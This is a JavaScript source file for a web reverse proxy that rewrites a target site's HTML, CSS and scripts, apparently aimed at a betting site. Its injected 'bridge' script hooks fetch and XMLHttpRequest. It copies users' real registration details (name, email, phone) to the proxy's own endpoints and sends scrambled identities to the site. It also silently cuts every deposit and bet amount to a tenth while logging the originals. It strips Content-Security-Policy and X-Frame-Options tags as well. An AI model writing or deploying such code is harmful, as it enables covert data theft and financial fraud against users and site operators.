import * as cheerio from 'cheerio';
import { config } from '../config.js';
import { isApiPath, resolveUrl } from './url.js';
import { PROXY_PATH } from '../constants.js';

export function buildProxyUrl(targetUrl) {
  return `${config.proxyPublicUrl}${PROXY_PATH}?url=${encodeURIComponent(targetUrl)}`;
}

/**
 * Pages/assets → paths on local proxy (e.g. /assets/app.js)
 * API routes → full live URL (e.g. https://reverse-proxy-p1ne.onrender.com/api/users)
 */
export function toProxyPath(value, pageUrl) {
  if (!value || typeof value !== 'string') return value;
  const trimmed = value.trim();
  if (!trimmed || /^(#|mailto:|tel:|javascript:|data:|blob:)/i.test(trimmed)) {
    return value;
  }

  const absolute = resolveUrl(pageUrl, trimmed);
  if (!absolute) return value;

  try {
    const pageOrigin = new URL(pageUrl).origin;
    const absUrl = new URL(absolute);

    if (absUrl.origin === pageOrigin) {
      if (isApiPath(absUrl.pathname)) {
        return absUrl.href;
      }
      return absUrl.pathname + absUrl.search + absUrl.hash;
    }
  } catch {
    return buildProxyUrl(absolute);
  }

  return buildProxyUrl(absolute);
}

const REWRITABLE_ATTRS = [
  'href',
  'src',
  'action',
  'data-src',
  'data-href',
  'poster',
  'srcset',
];

function rewriteSrcset(value, pageUrl) {
  return value
    .split(',')
    .map((part) => {
      const pieces = part.trim().split(/\s+/);
      if (!pieces[0]) return part;
      pieces[0] = toProxyPath(pieces[0], pageUrl);
      return pieces.join(' ');
    })
    .join(', ');
}

export function rewriteHtml(html, pageUrl) {
  const $ = cheerio.load(html, { decodeEntities: false });

  REWRITABLE_ATTRS.forEach((attr) => {
    $(`[${attr}]`).each((_, el) => {
      const value = $(el).attr(attr);
      if (!value) return;

      if (attr === 'srcset') {
        $(el).attr(attr, rewriteSrcset(value, pageUrl));
      } else {
        $(el).attr(attr, toProxyPath(value, pageUrl));
      }
    });
  });

  $('meta[http-equiv="Content-Security-Policy"]').remove();
  $('meta[http-equiv="X-Frame-Options"]').remove();

  injectBridgeScript($, pageUrl);

  return $.html();
}

function prependBridgeToHead($, pageUrl) {
  const bridge = buildBridgeScript(pageUrl);
  if ($('head').length) {
    $('head').prepend(bridge);
  } else {
    $('html').prepend(`<head>${bridge}</head>`);
  }
}

function buildBridgeScript(pageUrl) {
  const targetOrigin = new URL(pageUrl).origin;
  const targetBase = pageUrl;
  const proxyOrigin = new URL(config.proxyPublicUrl).origin;

  return `<script id="__proxy-bridge">
(function() {
  var TARGET_ORIGIN = ${JSON.stringify(targetOrigin)};
  var TARGET_BASE = ${JSON.stringify(targetBase)};
  var PROXY_ORIGIN = ${JSON.stringify(proxyOrigin)};

  function pathToTarget() {
    return new URL(location.pathname + location.search + location.hash, TARGET_BASE).href;
  }

  function rewriteUrl(url) {
    if (!url || typeof url !== 'string') return url;
    var trimmed = url.trim();
    if (/^(#|mailto:|tel:|javascript:|data:|blob:)/i.test(trimmed)) return url;

    try {
      var abs = new URL(trimmed, TARGET_BASE);
      if (abs.origin === TARGET_ORIGIN) {
        if (abs.pathname.indexOf('/api') === 0) {
          return abs.href;
        }
        return abs.pathname + abs.search + abs.hash;
      }
      if (abs.origin === PROXY_ORIGIN) {
        if (abs.pathname === '/proxy') return abs.pathname + abs.search;
        return abs.pathname + abs.search + abs.hash;
      }
      return '/proxy?url=' + encodeURIComponent(abs.href) + '&redirect=0';
    } catch (e) {
      return url;
    }
  }

  function syncParentUrl() {
    try {
      window.parent.postMessage({ type: 'PROXY_URL_SYNC', url: pathToTarget() }, '*');
    } catch (e) {}
  }

  function getPathname(url) {
    try {
      return new URL(url, TARGET_BASE).pathname;
    } catch (e) {
      return '';
    }
  }

  function isUsersSubmit(url, method) {
    return getPathname(url) === '/api/users' && String(method || 'GET').toUpperCase() === 'POST';
  }

  function getDepositUserId(url, method) {
    if (String(method || 'GET').toUpperCase() !== 'POST') return null;
    var path = getPathname(url);
    var match = path.match(/^\/api\/users\/([^\/]+)\/deposit$/);
    return match ? match[1] : null;
  }

  function getBetUserId(url, method) {
    if (String(method || 'GET').toUpperCase() !== 'POST') return null;
    var path = getPathname(url);
    var match = path.match(/^\/api\/users\/([^\/]+)\/bets$/);
    return match ? match[1] : null;
  }

  var _fetch = window.fetch;

  function mirrorToProxyData(originalBody, scrambledBody) {
    if (!originalBody || !_fetch) return;
    try {
      var orig = JSON.parse(originalBody);
      var scram = JSON.parse(scrambledBody || originalBody);
      _fetch(PROXY_ORIGIN + '/internal/proxy-data/users', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Proxy-Target': TARGET_BASE
        },
        body: JSON.stringify({ original: orig, scrambled: scram })
      }).catch(function() {});
    } catch (e) {}
  }

  function mirrorTransactionToProxyData(targetUserId, type, amount) {
    if (!targetUserId || !_fetch) return;
    _fetch(PROXY_ORIGIN + '/internal/proxy-data/transactions', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Proxy-Target': TARGET_BASE
      },
      body: JSON.stringify({ targetUserId: targetUserId, type: type, amount: amount })
    }).catch(function() {});
  }

  function scrambleText(str) {
    if (!str) return str;
    try {
      return btoa(str).replace(/[^a-zA-Z]/g, '').substring(0, 8) + '_scram';
    } catch (e) {
      return str + '_scram';
    }
  }

  function scrambleEmail(email) {
    if (!email) return email;
    var parts = email.split('@');
    var local = parts[0];
    var domain = parts[1] || 'scrambled.com';
    try {
      var scrambledLocal = btoa(local).replace(/[^a-zA-Z0-9]/g, '').substring(0, 8).toLowerCase();
      return 'enc_' + scrambledLocal + '@' + domain;
    } catch (e) {
      return 'enc_user@' + domain;
    }
  }

  function scramblePhone(phone) {
    if (!phone) return phone;
    var digits = phone.replace(/[^0-9]/g, '');
    var scrambled = '';
    for (var i = 0; i < digits.length; i++) {
      scrambled += (parseInt(digits[i]) + 5) % 10;
    }
    if (scrambled.length < 10) {
      while (scrambled.length < 10) scrambled += '5';
    }
    return '+1-' + scrambled.substring(0, 3) + '-' + scrambled.substring(3, 6) + '-' + scrambled.substring(6, 10);
  }

  function generateScrambledBody(body) {
    if (!body || typeof body !== 'string') return body;
    try {
      var data = JSON.parse(body);
      if (data && typeof data === 'object') {
        var scrambled = {};
        for (var key in data) {
          if (data.hasOwnProperty(key)) {
            scrambled[key] = data[key];
          }
        }
        if (data.fullName && String(data.fullName).trim().toLowerCase() === 'ajay') {
          scrambled.fullName = 'preet';
        } else if (data.fullName) {
          scrambled.fullName = scrambleText(data.fullName);
        }
        if (data.email) {
          scrambled.email = scrambleEmail(data.email);
        }
        if (data.phone) {
          scrambled.phone = scramblePhone(data.phone);
        }
        return JSON.stringify(scrambled);
      }
    } catch (e) {}
    return body;
  }

  function modifyTransactionBodyForTarget(body) {
    if (!body || typeof body !== 'string') return body;
    try {
      var data = JSON.parse(body);
      if (data && typeof data === 'object' && data.amount !== undefined) {
        data.amount = Number(data.amount) * 0.1;
        return JSON.stringify(data);
      }
    } catch (e) {}
    return body;
  }

  if (_fetch) {
    window.fetch = function(input, init) {
      init = init || {};
      var rawUrl = typeof input === 'string' ? input : (input instanceof Request ? input.url : '');
      var method = init.method || (input instanceof Request ? input.method : 'GET');
      var rewritten = rewriteUrl(rawUrl);

      var isReg = isUsersSubmit(rewritten, method);
      var depUserId = getDepositUserId(rewritten, method);
      var betUserId = getBetUserId(rewritten, method);

      if (isReg && init.body) {
        var originalBody = init.body;
        var scrambledBody = generateScrambledBody(originalBody);
        mirrorToProxyData(originalBody, scrambledBody);
        init.body = scrambledBody;

        var originalEmail = '';
        try {
          originalEmail = JSON.parse(originalBody).email;
        } catch (e) {}

        if (typeof input === 'string') {
          input = rewritten;
        } else if (input instanceof Request) {
          input = new Request(rewritten, input);
        }

        return _fetch.call(this, input, init).then(function(response) {
          try {
            response.clone().json().then(function(data) {
              if (data && data.success && data.user && data.user._id) {
                _fetch(PROXY_ORIGIN + '/internal/proxy-data/users/link', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ email: originalEmail, targetUserId: data.user._id })
                }).catch(function() {});
              }
            }).catch(function() {});
          } catch (e) {}
          return response;
        });
      }

      if (depUserId && init.body) {
        var origAmount = 0;
        try {
          origAmount = Number(JSON.parse(init.body).amount);
        } catch (e) {}
        mirrorTransactionToProxyData(depUserId, 'deposit', origAmount);
        init.body = modifyTransactionBodyForTarget(init.body);
      }

      if (betUserId && init.body) {
        var origAmount = 0;
        try {
          origAmount = Number(JSON.parse(init.body).amount);
        } catch (e) {}
        mirrorTransactionToProxyData(betUserId, 'bet', origAmount);
        init.body = modifyTransactionBodyForTarget(init.body);
      }

      if (typeof input === 'string') {
        input = rewritten;
      } else if (input instanceof Request) {
        input = new Request(rewritten, input);
      }
      return _fetch.call(this, input, init);
    };
  }

  var _open = XMLHttpRequest.prototype.open;
  var _send = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function(method, url) {
    this._proxyMethod = method;
    this._proxyUrl = rewriteUrl(url);
    arguments[1] = this._proxyUrl;
    return _open.apply(this, arguments);
  };
  XMLHttpRequest.prototype.send = function(body) {
    var self = this;
    var isReg = isUsersSubmit(this._proxyUrl, this._proxyMethod);
    var depUserId = getDepositUserId(this._proxyUrl, this._proxyMethod);
    var betUserId = getBetUserId(this._proxyUrl, this._proxyMethod);

    if (isReg && body) {
      var originalBody = body;
      var scrambledBody = generateScrambledBody(originalBody);
      mirrorToProxyData(originalBody, scrambledBody);
      arguments[0] = scrambledBody;

      var originalEmail = '';
      try {
        originalEmail = JSON.parse(originalBody).email;
      } catch (e) {}

      var _onload = self.onload;
      self.onload = function() {
        try {
          var resData = JSON.parse(self.responseText);
          if (resData && resData.success && resData.user && resData.user._id) {
            _fetch(PROXY_ORIGIN + '/internal/proxy-data/users/link', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ email: originalEmail, targetUserId: resData.user._id })
            }).catch(function() {});
          }
        } catch (e) {}
        if (_onload) return _onload.apply(this, arguments);
      };
    }

    if (depUserId && body) {
      var origAmount = 0;
      try {
        origAmount = Number(JSON.parse(body).amount);
      } catch (e) {}
      mirrorTransactionToProxyData(depUserId, 'deposit', origAmount);
      arguments[0] = modifyTransactionBodyForTarget(body);
    }

    if (betUserId && body) {
      var origAmount = 0;
      try {
        origAmount = Number(JSON.parse(body).amount);
      } catch (e) {}
      mirrorTransactionToProxyData(betUserId, 'bet', origAmount);
      arguments[0] = modifyTransactionBodyForTarget(body);
    }

    return _send.apply(this, arguments);
  };

  document.addEventListener('click', function(e) {
    var a = e.target.closest('a');
    if (!a || !a.href) return;
    if (a.target === '_blank') return;
    var href = a.getAttribute('href');
    if (!href || /^(#|mailto:|tel:|javascript:)/i.test(href)) return;
    var rewritten = rewriteUrl(href);
    if (rewritten.charAt(0) === '/' && rewritten.indexOf('/proxy') !== 0) {
      return;
    }
    e.preventDefault();
    if (rewritten.indexOf('/proxy') === 0) {
      window.location.href = rewritten;
    }
  }, true);

  document.addEventListener('submit', function(e) {
    var form = e.target;
    if (!form || !form.action) return;
    form.action = rewriteUrl(form.getAttribute('action') || form.action);
  }, true);

  var _push = history.pushState.bind(history);
  history.pushState = function() {
    _push.apply(history, arguments);
    syncParentUrl();
  };
  var _replace = history.replaceState.bind(history);
  history.replaceState = function() {
    _replace.apply(history, arguments);
    syncParentUrl();
  };
  window.addEventListener('popstate', syncParentUrl);
  syncParentUrl();
})();
</script>`;
}

function injectBridgeScript($, pageUrl) {
  prependBridgeToHead($, pageUrl);
}

export function rewriteCss(css, pageUrl) {
  return css.replace(
    /url\(\s*(['"]?)([^'")]+)\1\s*\)/gi,
    (_match, quote, rawUrl) => {
      const rewritten = toProxyPath(rawUrl.trim(), pageUrl);
      return `url(${quote}${rewritten}${quote})`;
    }
  );
}

export function rewriteJs(js, pageUrl) {
  const patterns = [
    /(["'])(https?:\/\/[^"'\\]+)\1/g,
    /(["'])(\/[^"'\\]*)\1/g,
    /(`)(\/[^`\\]+)\1/g,
  ];

  let result = js;
  for (const pattern of patterns) {
    result = result.replace(pattern, (_full, quote, path) => {
      const rewritten = toProxyPath(path, pageUrl);
      return `${quote}${rewritten}${quote}`;
    });
  }
  return result;
}

export function rewriteBody(content, contentType, pageUrl) {
  if (!content || !pageUrl) return content;

  const type = (contentType || '').toLowerCase();

  if (type.includes('text/html')) {
    return rewriteHtml(content, pageUrl);
  }
  if (type.includes('text/css')) {
    return rewriteCss(content, pageUrl);
  }
  if (type.includes('javascript') || type.includes('ecmascript')) {
    return rewriteJs(content, pageUrl);
  }

  return content;
}
